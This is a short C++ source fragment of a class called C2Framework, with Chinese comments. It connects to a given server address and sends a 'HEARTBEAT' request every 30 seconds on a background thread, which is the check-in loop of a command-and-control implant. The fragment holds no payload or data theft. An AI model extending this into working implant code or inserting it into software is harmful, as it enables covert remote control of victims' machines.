C2Framework::C2Framework(const std::string& server_address) : connection_(server_address), running_(false) {
    // 初始化 C2 框架
}

C2Framework::~C2Framework() {
    stop();
}

void C2Framework::start() {
    running_ = true;
    heartbeat_thread_ = std::thread(&C2Framework::heartbeatLoop, this);
}

void C2Framework::stop() {
    running_ = false;
    if (heartbeat_thread_.joinable()) {
        heartbeat_thread_.join();
    }
}

void C2Framework::heartbeatLoop() {
    while (running_) {
        // 发送心跳请求
        connection_.sendRequest("HEARTBEAT");
        std::this_thread::sleep_for(std::chrono::seconds(30));
    }
}
